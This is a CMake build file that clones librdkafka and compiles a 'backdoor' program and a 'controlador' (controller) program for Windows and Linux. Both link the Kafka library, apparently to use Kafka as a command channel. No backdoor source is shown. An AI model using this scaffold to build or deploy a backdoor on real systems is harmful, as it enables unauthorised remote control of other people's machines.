cmake_minimum_required(VERSION 3.8 FATAL_ERROR)
set(PROJECT_VERSION "1.0.0")
set (CMAKE_CXX_STANDARD 11)

execute_process(COMMAND git clone https://github.com/edenhill/librdkafka.git)
execute_process(COMMAND git checkout tags/v1.2.1 WORKING_DIRECTORY librdkafka)
	
add_subdirectory(${CMAKE_CURRENT_BINARY_DIR}/librdkafka ${CMAKE_CURRENT_BINARY_DIR}/librdkafka)

#se for windows
if(WIN32)
	add_executable(backdoor windows/backdoor.cpp)
	target_link_libraries(backdoor PUBLIC rdkafka++)
	
	add_executable(controlador windows/controlador.cpp)
	target_link_libraries(controlador PUBLIC rdkafka++)
endif(WIN32)

#se for linux
if(NOT WIN32)
	add_executable(backdoor linux/backdoor.c)
	target_link_libraries(backdoor PUBLIC rdkafka++)
	
	add_executable(controlador linux/controlador.c)
	target_link_libraries(controlador PUBLIC rdkafka++)
endif(NOT WIN32)
